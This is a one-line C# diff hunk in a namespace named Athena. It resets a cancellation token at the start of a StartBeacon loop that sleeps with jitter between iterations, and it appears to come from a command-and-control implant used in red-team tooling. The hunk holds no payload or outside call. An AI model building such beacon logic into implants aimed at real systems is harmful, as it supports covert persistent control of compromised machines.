@@ -333,6 +333,7 @@ namespace Athena
         }
         public async Task StartBeacon()
         {
+            this.cts = new CancellationTokenSource();
             while (!cts.Token.IsCancellationRequested)
             {
                 await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
